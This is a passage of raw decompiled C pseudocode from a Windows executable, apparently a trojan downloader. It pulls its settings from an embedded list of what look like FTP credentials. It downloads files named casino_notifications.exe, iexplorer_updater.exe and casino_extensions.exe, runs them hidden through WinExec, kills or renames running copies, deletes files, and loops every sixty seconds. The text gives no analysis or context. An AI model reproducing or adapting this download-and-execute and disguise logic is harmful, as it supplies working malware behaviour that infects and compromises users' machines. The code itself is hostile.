  FUN_00404080((int *)&local_15c,2);
  FUN_00404080((int *)&local_10,3);
  FUN_00404080((int *)&param_5,2);
  return;
}



void FUN_004160f8(undefined *param_1,undefined *param_2,undefined *param_3,int param_4,byte *param_5
                 ,undefined *param_6)

{
  undefined *puVar1;
  char cVar2;
  LPCSTR pCVar3;
  BOOL BVar4;
  int iVar5;
  byte *pbVar6;
  undefined4 uVar7;
  undefined4 extraout_ECX;
  int extraout_ECX_00;
  int iVar8;
  byte **in_FS_OFFSET;
  UINT UVar9;
  undefined *puVar10;
  byte *pbStack_3c;
  undefined *puStack_38;
  undefined *puStack_34;
  undefined4 *local_24;
  undefined *local_20;
  undefined *local_1c;
  int *local_18;
  undefined local_11;
  undefined *local_10;
  undefined *local_c;
  undefined *local_8;
  
  local_24 = (undefined4 *)0x0;
  local_1c = (undefined *)0x0;
  local_20 = (undefined *)0x0;
  puStack_34 = (undefined *)0x41611d;
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_34 = (undefined *)0x416125;
  FUN_004044e8((int)local_c);
  puStack_34 = (undefined *)0x41612d;
  FUN_004044e8((int)local_10);
  puStack_34 = (undefined *)0x416135;
  FUN_004044e8((int)param_6);
  puStack_34 = (undefined *)0x41613d;
  FUN_004044e8((int)param_5);
  puStack_38 = &LAB_004162c8;
  pbStack_3c = *in_FS_OFFSET;
  *in_FS_OFFSET = (byte *)&pbStack_3c;
  local_11 = 0;
  puStack_34 = &stack0xfffffffc;
  local_18 = (int *)FUN_00403578((int *)PTR_PTR_LAB_0040fdc4,'\x01',extraout_ECX);
  pbVar6 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffb8;
  (**(code **)(*local_18 + 0x68))(local_18,local_8);
  do {
    pCVar3 = FUN_004044f8(local_8);
    BVar4 = DeleteFileA(pCVar3);
  } while (BVar4 == 0);
  iVar5 = (**(code **)(*local_18 + 0x14))();
  if (-1 < iVar5 + -1) {
    iVar8 = 0;
    do {
      (**(code **)(*local_18 + 0xc))(local_18,iVar8,&local_1c);
      (**(code **)(*local_18 + 0xc))(local_18,iVar8,&local_24);
      FUN_00415ea8(local_24,(int *)&local_20);
      puVar1 = local_20;
      if (param_4 == 1) {
        puVar10 = local_1c;
        pbVar6 = FUN_00407398(param_5,(byte *)0x15,extraout_ECX_00);
        cVar2 = FUN_00415c30(local_c,local_10,param_6,pbVar6,puVar1,puVar10);
        if ((cVar2 != '\0') && (uVar7 = FUN_00407708(local_20), (char)uVar7 != '\0')) {
          UVar9 = 0;
          pCVar3 = FUN_004044f8(local_20);
          UVar9 = WinExec(pCVar3,UVar9);
          if (0x1f < UVar9) {
            local_11 = 1;
          }
        }
      }
      else if (param_4 == 2) {
        puVar10 = local_1c;
        pbVar6 = FUN_00407398(param_5,(byte *)0x15,extraout_ECX_00);
        cVar2 = FUN_00415f5c(local_c,local_10,param_6,pbVar6,puVar1,puVar10);
        if ((cVar2 != '\0') && (uVar7 = FUN_00407708(local_20), (char)uVar7 != '\0')) {
          UVar9 = 0;
          pCVar3 = FUN_004044f8(local_20);
          UVar9 = WinExec(pCVar3,UVar9);
          if (0x1f < UVar9) {
            local_11 = 1;
          }
        }
      }
      iVar8 = iVar8 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
  }
  *in_FS_OFFSET = pbVar6;
  FUN_004035a8(local_18);
  return;
}



void FUN_004162dc(undefined *param_1)

{
  undefined4 uVar1;
  LPCSTR lpFileName;
  undefined4 *in_FS_OFFSET;
  DWORD dwDesiredAccess;
  DWORD dwShareMode;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  HANDLE pvVar2;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined *local_8;
  
  puStack_10 = (undefined *)0x4162ec;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_14 = &LAB_0041634e;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  puStack_10 = &stack0xfffffffc;
  uVar1 = FUN_00407708(local_8);
  if ((char)uVar1 != '\0') {
    pvVar2 = (HANDLE)0x0;
    dwFlagsAndAttributes = 0x80;
    dwCreationDisposition = 3;
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    dwShareMode = 0;
    dwDesiredAccess = 0xc0000000;
    lpFileName = FUN_004044f8(local_8);
    pvVar2 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                         dwCreationDisposition,dwFlagsAndAttributes,pvVar2);
    if (pvVar2 != (HANDLE)0xffffffff) {
      CloseHandle(pvVar2);
    }
  }
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00416355;
  puStack_14 = (undefined *)0x41634d;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_0041635c(void)

{
  char cVar1;
  undefined uVar2;
  BOOL BVar3;
  undefined4 uVar4;
  LPCSTR pCVar5;
  UINT UVar6;
  byte *pbVar7;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_CL_01;
  int iVar8;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  int extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined *unaff_EBX;
  byte **in_FS_OFFSET;
  float10 in_ST0;
  float10 fVar9;
  float10 fVar10;
  float10 in_ST1;
  float10 in_ST2;
  int local_74;
  undefined *local_70;
  undefined *local_6c;
  int local_68;
  undefined *local_64;
  undefined *puStackY_60;
  undefined4 *local_5c;
  undefined8 in_stack_ffffffa8;
  int iVar11;
  undefined *in_stack_ffffffb0;
  undefined *in_stack_ffffffb4;
  undefined4 *in_stack_ffffffbc;
  HWND uCmdShow;
  byte *in_stack_ffffffc8;
  undefined **ppuVar12;
  HWND__ HVar13;
  undefined **ppuVar14;
  HWND__ local_1c;
  undefined *local_18;
  byte *local_14;
  undefined *local_c;
  undefined4 *local_8;
  
  iVar11 = (int)((ulonglong)in_stack_ffffffa8 >> 0x20);
  local_14 = &stack0xfffffffc;
  iVar8 = 0xe;
  do {
    local_8 = (undefined4 *)0x0;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  local_18 = &LAB_0041679c;
  local_1c.unused = (int)*in_FS_OFFSET;
  *in_FS_OFFSET = (byte *)&local_1c;
  FUN_00402a1c();
  FUN_00417448();
  BVar3 = PeekMessageA((LPMSG)&stack0xffffffc4,(HWND)0x0,0,0,1);
  if (BVar3 != 0) {
    TranslateMessage((MSG *)&stack0xffffffc4);
    DispatchMessageA((MSG *)&stack0xffffffc4);
  }
  iVar8 = FUN_00402e68(0x1e);
  FUN_004040f4((int *)&local_8,(int)(&PTR_s_ilyask_1392639195_ftp_user_kz_21_0041845c)[iVar8]);
  FUN_004040f4((int *)&local_c,*(int *)PTR_DAT_00418678);
  FUN_004040f4((int *)&stack0xfffffff0,*(int *)PTR_DAT_00418678);
  FUN_004040f4((int *)&local_18,*(int *)PTR_DAT_00418678);
  FUN_004040f4((int *)&local_14,0x4167f4);
  iVar8 = FUN_00415d7c(PTR_s_431n3_23o13_324ti23_9560f_4i0ca__00418448);
  FUN_00407538(iVar8 < 0x15181,'\0',(int *)&stack0xffffffbc);
  FUN_00404344((int *)&stack0xffffffc0,(undefined4 *)s__Casino_Notifications__keyCheck___00416800,
               in_stack_ffffffbc);
  FUN_00417448();
  FUN_004040f4(&local_1c.unused,(int)PTR_s_casino_notifications_exe_004183c4);
  FUN_004040f4((int *)&stack0xffffffe0,(int)PTR_s_casino_notifications_exe_004183c4);
  ppuVar12 = &local_18;
  FUN_0041578c((int)local_8,(int *)&local_c,&stack0xfffffff0,(int *)&stack0xffffffe0,
               &local_1c.unused,(int *)&local_14,(int *)ppuVar12);
  FUN_00404344((int *)&stack0xffffffb8,(undefined4 *)s__Make_Parse_to_address__00416830,local_8);
  FUN_00417448();
  fVar9 = in_ST0;
  ppuVar14 = ppuVar12;
  if (iVar8 >= 0x15181) {
    HVar13.unused = local_1c.unused;
    in_stack_ffffffc8 = FUN_00407398(local_14,(byte *)0x15,extraout_ECX);
    cVar1 = FUN_00415c30(local_18,local_c,unaff_EBX,in_stack_ffffffc8,(undefined *)ppuVar12,
                         (undefined *)HVar13.unused);
    fVar9 = in_ST0;
    if (cVar1 != '\0') {
      FUN_00404344((int *)&stack0xffffffb4,DAT_004198e0,
                   (undefined4 *)PTR_s_casino_notifications_exe_004183c4);
      uVar4 = FUN_00407708(in_stack_ffffffb4);
      fVar9 = in_ST0;
      if ((char)uVar4 != '\0') {
        uCmdShow = (HWND)0x0;
        FUN_00404344((int *)&stack0xffffffb0,DAT_004198e0,
                     (undefined4 *)PTR_s_casino_notifications_exe_004183c4);
        pCVar5 = FUN_004044f8(in_stack_ffffffb0);
        UVar6 = WinExec(pCVar5,(UINT)uCmdShow);
        fVar9 = in_ST0;
        if (0x1f < UVar6) {
          FUN_00417448();
          fVar9 = in_ST1;
          in_ST1 = in_ST2;
          uVar2 = FUN_00408bec();
          uVar4 = FUN_00414930(uVar2,extraout_DL,extraout_CL,(double)in_ST0);
          uVar2 = (undefined)uVar4;
          FUN_004142f4(0x416924,0x4168b8,(int *)&stack0xffffffac);
          FUN_00404300((int *)&stack0xffffffac,DAT_004198f4);
          FUN_004148b8(iVar11,PTR_s_431n3_23o13_324ti23_9560f_4i0ca__00418448,extraout_ECX_00,uVar2)
          ;
        }
      }
    }
  }
  iVar8 = FUN_00415d7c(PTR_s_0675i_75e3x_983p32l_or23f_u7dca__0041844c);
  FUN_00407538(iVar8 < 0x15181,'\0',(int *)&local_5c);
  FUN_00404344((int *)&stack0xffffffa8,(undefined4 *)s__Here_is_checking_and_downloadin_00416948,
               local_5c);
  FUN_00417448();
  fVar10 = fVar9;
  if (iVar8 >= 0x15181) {
    FUN_004040f4(&local_1c.unused,(int)PTR_s_iexplorer_updater_exe_004183cc);
    FUN_004040f4((int *)&stack0xffffffe0,(int)PTR_s_iexplorer_updater_exe_004183cc);
    ppuVar12 = ppuVar14;
    HVar13.unused = local_1c.unused;
    pbVar7 = FUN_00407398(local_14,(byte *)0x15,extraout_ECX_01);
    cVar1 = FUN_00415c30(local_18,local_c,unaff_EBX,pbVar7,(undefined *)ppuVar12,
                         (undefined *)HVar13.unused);
    fVar10 = fVar9;
    if (cVar1 != '\0') {
      FUN_00404344((int *)&puStackY_60,DAT_004198e0,
                   (undefined4 *)PTR_s_iexplorer_updater_exe_004183cc);
      uVar4 = FUN_00407708(puStackY_60);
      fVar10 = fVar9;
      if ((char)uVar4 != '\0') {
        UVar6 = 0;
        FUN_00404344((int *)&local_64,DAT_004198e0,
                     (undefined4 *)PTR_s_iexplorer_updater_exe_004183cc);
        pCVar5 = FUN_004044f8(local_64);
        UVar6 = WinExec(pCVar5,UVar6);
        fVar10 = fVar9;
        if (0x1f < UVar6) {
          fVar10 = in_ST1;
          uVar2 = FUN_00408bec();
          uVar4 = FUN_00414930(uVar2,extraout_DL_00,extraout_CL_00,(double)fVar9);
          uVar2 = (undefined)uVar4;
          FUN_004142f4(0x416924,0x4168b8,&local_68);
          FUN_00404300(&local_68,DAT_004198f4);
          FUN_004148b8(local_68,PTR_s_iexplorer_updater_exe_004183cc,extraout_ECX_02,uVar2);
        }
      }
    }
  }
  iVar8 = FUN_00415d7c(PTR_s_u432p_21d19_at2376p_r0g5a_8t3x9__00418450);
  if (0x15180 < iVar8) {
    FUN_004040f4(&local_1c.unused,(int)PTR_s_update_programs_txt_004183d4);
    FUN_004040f4((int *)&stack0xffffffe0,(int)PTR_s_update_programs_txt_004183d4);
    ppuVar12 = ppuVar14;
    HVar13.unused = local_1c.unused;
    pbVar7 = FUN_00407398(local_14,(byte *)0x15,extraout_ECX_03);
    cVar1 = FUN_00415c30(local_18,local_c,unaff_EBX,pbVar7,(undefined *)ppuVar12,
                         (undefined *)HVar13.unused);
    if (cVar1 != '\0') {
      FUN_00404344((int *)&local_6c,DAT_004198e0,(undefined4 *)PTR_s_update_programs_txt_004183d4);
      uVar4 = FUN_00407708(local_6c);
      if ((char)uVar4 != '\0') {
        iVar8 = 1;
        pbVar7 = local_14;
        FUN_00404344((int *)&local_70,DAT_004198e0,ppuVar14);
        cVar1 = FUN_004160f8(local_70,local_18,local_c,iVar8,pbVar7,unaff_EBX);
        if (cVar1 != '\0') {
          uVar2 = FUN_00408bec();
          local_5c = (undefined4 *)0x416735;
          uVar4 = FUN_00414930(uVar2,extraout_DL_01,extraout_CL_01,(double)fVar10);
          uVar2 = (undefined)uVar4;
          local_5c = (undefined4 *)0x416749;
          FUN_004142f4(0x416924,0x4168b8,&local_74);
          local_5c = (undefined4 *)0x416757;
          FUN_00404300(&local_74,DAT_004198f4);
          local_5c = (undefined4 *)0x416765;
          FUN_004148b8(local_74,PTR_s_u432p_21d19_at2376p_r0g5a_8t3x9__00418450,extraout_ECX_04,
                       uVar2);
        }
      }
    }
  }
  Sleep(60000);
  FUN_0041635c();
  *in_FS_OFFSET = in_stack_ffffffc8;
  FUN_00404080(&local_74,0xe);
  FUN_00404080((int *)&stack0xffffffe0,7);
  return;
}



void FUN_00416988(void)

{
  char cVar1;
  undefined uVar2;
  BOOL BVar3;
  byte *pbVar4;
  undefined4 uVar5;
  LPCSTR pCVar6;
  UINT UVar7;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_CL_01;
  undefined extraout_CL_02;
  undefined extraout_CL_03;
  undefined extraout_CL_04;
  int iVar8;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  int extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  int *in_FS_OFFSET;
  float10 in_ST0;
  float10 in_ST1;
  int local_7c;
  undefined *local_78;
  undefined *local_74;
  int local_70;
  int local_6c;
  undefined *local_68;
  undefined *local_64;
  undefined *local_60;
  int local_5c;
  int local_58;
  undefined8 in_stack_ffffffac;
  undefined *puVar9;
  undefined8 in_stack_ffffffb8;
  int in_stack_ffffffc0;
  HWND pHVar10;
  undefined *puVar11;
  HWND *ppHVar12;
  undefined **ppuVar13;
  HWND *ppHVar14;
  undefined **ppuVar15;
  undefined *local_18;
  HWND local_14;
  undefined *local_10;
  undefined *local_c;
  undefined4 *local_8;
  
  local_10 = &stack0xfffffffc;
  iVar8 = 0xf;
  do {
    local_8 = (undefined4 *)0x0;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  local_14 = (HWND)&LAB_00416e66;
  local_18 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = (int)&local_18;
  FUN_00402a1c();
  FUN_00417448();
  BVar3 = PeekMessageA((LPMSG)&stack0xffffffc4,(HWND)0x0,0,0,1);
  if (BVar3 != 0) {
    TranslateMessage((MSG *)&stack0xffffffc4);
    DispatchMessageA((MSG *)&stack0xffffffc4);
  }
  iVar8 = FUN_00402e68(0x1e);
  FUN_004040f4((int *)&local_8,(int)(&PTR_s_ilyask_1392639195_ftp_user_kz_21_0041845c)[iVar8]);
  FUN_004040f4((int *)&local_c,*(int *)PTR_DAT_00418678);
  FUN_004040f4((int *)&local_10,*(int *)PTR_DAT_00418678);
  FUN_004040f4((int *)&local_18,*(int *)PTR_DAT_00418678);
  FUN_004040f4((int *)&local_14,0x416ec0);
  FUN_004040f4((int *)&stack0xffffffe4,(int)PTR_s_hsmhzmrfvknhslktmtvhtwsrdrhphs_u_004183dc);
  FUN_004040f4((int *)&stack0xffffffe0,(int)PTR_s_hsmhzmrfvknhslktmtvhtwsrdrhphs_u_004183dc);
  ppuVar13 = &local_18;
  ppHVar12 = &local_14;
  FUN_0041578c((int)local_8,(int *)&local_c,&local_10,(int *)&stack0xffffffe0,
               (int *)&stack0xffffffe4,(int *)ppHVar12,(int *)ppuVar13);
  FUN_00404344((int *)&stack0xffffffc0,(undefined4 *)s__Address_to_parse___>_00416ecc,local_8);
  FUN_00417448();
  iVar8 = FUN_00415d7c(PTR_s_7642u_4p2d1_12432at_e093t_23543__00418454);
  if (0x15180 < iVar8) {
    ppHVar14 = ppHVar12;
    ppuVar15 = ppuVar13;
    pbVar4 = FUN_00407398((byte *)local_14,(byte *)0x15,extraout_ECX);
    cVar1 = FUN_00415c30(local_18,local_c,local_10,pbVar4,(undefined *)ppHVar12,
                         (undefined *)ppuVar13);
    ppHVar12 = ppHVar14;
    ppuVar13 = ppuVar15;
    if (cVar1 != '\0') {
      FUN_00404344((int *)&stack0xffffffbc,DAT_004198e0,
                   (undefined4 *)PTR_s_hsmhzmrfvknhslktmtvhtwsrdrhphs_u_004183dc);
      uVar5 = FUN_00407708((undefined *)((ulonglong)in_stack_ffffffb8 >> 0x20));
      ppHVar12 = ppHVar14;
      ppuVar13 = ppuVar15;
      if ((char)uVar5 != '\0') {
        in_stack_ffffffc0 = 2;
        puVar9 = (undefined *)in_stack_ffffffb8;
        pHVar10 = local_14;
        puVar11 = local_10;
        FUN_00404344((int *)&stack0xffffffb8,DAT_004198e0,
                     (undefined4 *)PTR_s_hsmhzmrfvknhslktmtvhtwsrdrhphs_u_004183dc);
        cVar1 = FUN_004160f8(puVar9,local_18,local_c,in_stack_ffffffc0,(byte *)pHVar10,puVar11);
        ppHVar12 = ppHVar14;
        ppuVar13 = ppuVar15;
        if (cVar1 != '\0') {
          uVar2 = FUN_00408bec();
          uVar5 = FUN_00414930(uVar2,extraout_DL,extraout_CL,(double)in_ST0);
          uVar2 = (undefined)uVar5;
          FUN_004142f4(0x416f58,0x416eec,(int *)&stack0xffffffb4);
          iVar8 = 0x416b51;
          FUN_00404300((int *)&stack0xffffffb4,DAT_004198f4);
          FUN_004148b8(iVar8,PTR_s_7642u_4p2d1_12432at_e093t_23543__00418454,extraout_ECX_00,uVar2);
          in_ST0 = in_ST1;
          ppHVar12 = ppHVar14;
          ppuVar13 = ppuVar15;
        }
      }
    }
  }
  iVar8 = FUN_00415d7c(PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458);
  if (0x15180 < iVar8) {
    cVar1 = FUN_00415248('\0');
    if (cVar1 == '\0') {
      FUN_00404344((int *)&local_60,DAT_004198e0,(undefined4 *)PTR_s_casino_extensions_exe_004183b4)
      ;
      uVar5 = FUN_00407708(local_60);
      if ((char)uVar5 == '\0') {
        FUN_004040f4((int *)&stack0xffffffe4,(int)PTR_s_casino_extensions_exe_004183b4);
        FUN_004040f4((int *)&stack0xffffffe0,(int)PTR_s_casino_extensions_exe_004183b4);
        ppHVar14 = ppHVar12;
        pbVar4 = FUN_00407398((byte *)local_14,(byte *)0x15,extraout_ECX_05);
        cVar1 = FUN_00415c30(local_18,local_c,local_10,pbVar4,(undefined *)ppHVar14,
                             (undefined *)ppuVar13);
        if (cVar1 != '\0') {
          FUN_00404344((int *)&local_74,DAT_004198e0,ppHVar12);
          uVar5 = FUN_00407708(local_74);
          if ((char)uVar5 != '\0') {
            UVar7 = 0;
            FUN_00404344((int *)&local_78,DAT_004198e0,ppHVar12);
            pCVar6 = FUN_004044f8(local_78);
            local_58 = 0x416de9;
            UVar7 = WinExec(pCVar6,UVar7);
            if (0x1f < UVar7) {
              uVar2 = FUN_00408bec();
              local_58 = 0x416dff;
              uVar5 = FUN_00414930(uVar2,extraout_DL_04,extraout_CL_04,(double)in_ST0);
              uVar2 = (undefined)uVar5;
              local_58 = 0x416e13;
              FUN_004142f4(0x416f58,0x416eec,&local_7c);
              local_58 = 0x416e21;
              FUN_00404300(&local_7c,DAT_004198f4);
              local_58 = 0x416e2f;
              FUN_004148b8(local_7c,PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458,extraout_ECX_06,
                           uVar2);
            }
          }
        }
      }
      else {
        FUN_00404344((int *)&local_64,DAT_004198e0,
                     (undefined4 *)PTR_s_casino_extensions_exe_004183b4);
        cVar1 = FUN_004162dc(local_64);
        if (cVar1 == '\0') {
          UVar7 = 0;
          FUN_00404344((int *)&local_68,DAT_004198e0,
                       (undefined4 *)PTR_s_casino_extensions_exe_004183b4);
          pCVar6 = FUN_004044f8(local_68);
          UVar7 = WinExec(pCVar6,UVar7);
          if (0x1f < UVar7) {
            uVar2 = FUN_00408bec();
            uVar5 = FUN_00414930(uVar2,extraout_DL_02,extraout_CL_02,(double)in_ST0);
            uVar2 = (undefined)uVar5;
            FUN_004142f4(0x416f58,0x416eec,&local_6c);
            FUN_00404300(&local_6c,DAT_004198f4);
            FUN_004148b8(local_6c,PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458,extraout_ECX_03,
                         uVar2);
          }
        }
        else {
          uVar2 = FUN_00408bec();
          uVar5 = FUN_00414930(uVar2,extraout_DL_03,extraout_CL_03,(double)in_ST0);
          uVar2 = (undefined)uVar5;
          FUN_004142f4(0x416f58,0x416eec,&local_70);
          FUN_00404300(&local_70,DAT_004198f4);
          FUN_004148b8(local_70,PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458,extraout_ECX_04,
                       uVar2);
        }
      }
    }
    else {
      FUN_00404344((int *)&stack0xffffffb0,DAT_004198e0,DAT_004198cc);
      cVar1 = FUN_004162dc((undefined *)((ulonglong)in_stack_ffffffac >> 0x20));
      puVar11 = (undefined *)in_stack_ffffffac;
      if (cVar1 == '\0') {
        UVar7 = 0;
        FUN_00404344((int *)&stack0xffffffac,DAT_004198e0,DAT_004198cc);
        pCVar6 = FUN_004044f8(puVar11);
        UVar7 = WinExec(pCVar6,UVar7);
        if (0x1f < UVar7) {
          uVar2 = FUN_00408bec();
          uVar5 = FUN_00414930(uVar2,extraout_DL_00,extraout_CL_00,(double)in_ST0);
          uVar2 = (undefined)uVar5;
          FUN_004142f4(0x416f58,0x416eec,&local_58);
          FUN_00404300(&local_58,DAT_004198f4);
          FUN_004148b8(local_58,PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458,extraout_ECX_01,
                       uVar2);
        }
      }
      else {
        uVar2 = FUN_00408bec();
        uVar5 = FUN_00414930(uVar2,extraout_DL_01,extraout_CL_01,(double)in_ST0);
        uVar2 = (undefined)uVar5;
        FUN_004142f4(0x416f58,0x416eec,&local_5c);
        FUN_00404300(&local_5c,DAT_004198f4);
        FUN_004148b8(local_5c,PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458,extraout_ECX_02,uVar2)
        ;
      }
    }
  }
  Sleep(60000);
  FUN_00416988();
  *in_FS_OFFSET = in_stack_ffffffc0;
  FUN_00404080(&local_7c,0x10);
  FUN_00404080((int *)&stack0xffffffe0,7);
  return;
}



void FUN_00416f74(void)

{
  char cVar1;
  LPCSTR lpCmdLine;
  undefined4 *in_FS_OFFSET;
  UINT uCmdShow;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined *local_c;
  undefined *local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  local_c = (undefined *)0x0;
  puStack_14 = &LAB_00416fe8;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  FUN_00404344((int *)&local_8,DAT_004198e0,DAT_004198cc);
  cVar1 = FUN_004162dc(local_8);
  if (cVar1 == '\0') {
    uCmdShow = 0;
    FUN_00404344((int *)&local_c,DAT_004198e0,DAT_004198cc);
    lpCmdLine = FUN_004044f8(local_c);
    WinExec(lpCmdLine,uCmdShow);
  }
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00416fef;
  puStack_14 = (undefined *)0x416fe7;
  FUN_00404080((int *)&local_c,2);
  return;
}



void FUN_00416ff4(undefined *param_1,char *param_2)

{
  char *pcVar1;
  char **in_FS_OFFSET;
  char *pcStack_180;
  undefined *puStack_17c;
  undefined *puStack_178;
  char *pcStack_174;
  undefined *puStack_170;
  undefined *puStack_16c;
  int local_15c;
  undefined4 local_158 [83];
  char *local_c;
  undefined *local_8;
  
  local_15c = 0;
  puStack_16c = (undefined *)0x417016;
  local_c = param_2;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_16c = (undefined *)0x41701e;
  FUN_004044e8((int)local_c);
  pcVar1 = local_c;
  puStack_170 = &LAB_004170ca;
  pcStack_174 = *in_FS_OFFSET;
  *in_FS_OFFSET = (char *)&pcStack_174;
  puStack_17c = &LAB_0041709a;
  pcStack_180 = *in_FS_OFFSET;
  *in_FS_OFFSET = (char *)&pcStack_180;
  puStack_178 = &stack0xfffffffc;
  puStack_16c = &stack0xfffffffc;
  FUN_004043b8(&local_15c,4);
  FUN_00417448();
  FUN_00402d28(local_158,local_8);
  FUN_00402e84((int)local_158,local_c);
  FUN_00402784();
  FUN_00417448();
  *in_FS_OFFSET = pcVar1;
  *in_FS_OFFSET = s__Procedure_Rename_File___OldName_004170e0;
  puStack_17c = &LAB_004170d1;
  pcStack_180 = (char *)0x4170bc;
  FUN_0040405c(&local_15c);
  pcStack_180 = (char *)0x4170c9;
  FUN_00404080((int *)&local_c,2);
  return;
}



void FUN_00417140(void)

{
  char *pcVar1;
  char cVar2;
  undefined4 uVar3;
  LPCSTR lpCmdLine;
  char **in_FS_OFFSET;
  undefined uVar4;
  UINT uCmdShow;
  char *local_28;
  undefined4 *local_24;
  char *local_20;
  undefined4 *local_1c;
  undefined *local_18;
  char *local_14;
  char *local_10;
  undefined *local_c;
  undefined *local_8;
  
  local_14 = &stack0xfffffffc;
  local_10 = (char *)0x4;
  do {
    local_8 = (undefined *)0x0;
    local_10 = local_10 + -1;
  } while (local_10 != (char *)0x0);
  local_18 = &LAB_004172e0;
  local_1c = (undefined4 *)*in_FS_OFFSET;
  *in_FS_OFFSET = (char *)&local_1c;
  local_20 = (char *)0x417168;
  FUN_00417448();
  local_20 = (char *)0x41717c;
  FUN_00404344((int *)&local_8,DAT_004198e4,(undefined4 *)PTR_s_casino_extensions_exe_004183b4);
  local_20 = (char *)0x417184;
  uVar3 = FUN_00407708(local_8);
  if ((char)uVar3 != '\0') {
    local_20 = (char *)0x4171a0;
    FUN_00404344((int *)&local_c,DAT_004198e4,(undefined4 *)PTR_s_casino_extensions_exe_004183b4);
    local_20 = (char *)0x4171a8;
    cVar2 = FUN_004162dc(local_c);
    uVar4 = cVar2 == '\0';
    if ((bool)uVar4) {
      local_20 = s__The_file_is_not_running_and_wil_00417414;
      local_24 = DAT_004198e4;
      local_28 = PTR_s_casino_extensions_exe_004183b4;
      FUN_004043b8((int *)&local_28,3);
      FUN_00417448();
    }
    else {
      local_20 = (char *)0x4171ba;
      FUN_00417448();
      local_20 = (char *)0x4171ca;
      FUN_00404444(DAT_004198e8,(uint *)PTR_s_casino_extensions_exe_004183b4);
      if ((bool)uVar4) {
        local_20 = (char *)0x4171da;
        FUN_004029bc(0,(int *)&local_10);
        local_20 = local_10;
        local_24 = (undefined4 *)0x4171f1;
        FUN_00404344((int *)&local_14,DAT_004198ec,(undefined4 *)s_Casino_ext_exe_00417378);
        pcVar1 = local_20;
        local_20 = (char *)0x4171fa;
        FUN_00416ff4(pcVar1,local_14);
        local_20 = s__The_Current_file_was_renamed____00417390;
        local_24 = (undefined4 *)0x417209;
        FUN_004029bc(0,(int *)&local_1c);
        local_24 = local_1c;
        local_28 = s__in___>_004173bc;
        FUN_004043b8((int *)&local_18,5);
        FUN_00417448();
        uCmdShow = 0;
        FUN_00404344((int *)&local_20,DAT_004198ec,(undefined4 *)s_Casino_ext_exe_00417378);
        lpCmdLine = FUN_004044f8(local_20);
        WinExec(lpCmdLine,uCmdShow);
        PostQuitMessage(0);
      }
      else {
        local_20 = s__KillTask___>_004173d0;
        local_24 = (undefined4 *)PTR_s_casino_extensions_exe_004183b4;
        local_28 = &DAT_004173ec;
        FUN_004043b8((int *)&local_24,6);
        FUN_00417448();
        FUN_00415ab0(PTR_s_casino_extensions_exe_004183b4);
      }
    }
  }
  *in_FS_OFFSET = local_28;
  local_20 = &LAB_004172e7;
  local_24 = (undefined4 *)0x4172df;
  FUN_00404080((int *)&local_28,9);
  return;
}



void FUN_00417448(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack_10 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack_10;
  *in_FS_OFFSET = uVar1;
  return;
}



void FUN_00417470(undefined *param_1,undefined *param_2)

{
  undefined4 uVar1;
  LPCSTR pCVar2;
  BOOL BVar3;
  LPCSTR pCVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  undefined4 local_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined *local_c;
  undefined *local_8;
  
  puStack_20 = (undefined *)0x417487;
  local_c = param_2;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_20 = (undefined *)0x41748f;
  FUN_004044e8((int)local_c);
  puStack_24 = &LAB_0041753a;
  local_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_28;
  puStack_30 = &LAB_00417515;
  uStack_34 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_34;
  puStack_2c = &stack0xfffffffc;
  puStack_20 = &stack0xfffffffc;
  uVar1 = FUN_00407708(local_c);
  if ((char)uVar1 == '\0') {
    pCVar2 = FUN_004044f8(local_c);
    pCVar4 = FUN_004044f8(local_8);
    MoveFileA(pCVar4,pCVar2);
  }
  else {
    pCVar2 = FUN_004044f8(local_c);
    BVar3 = DeleteFileA(pCVar2);
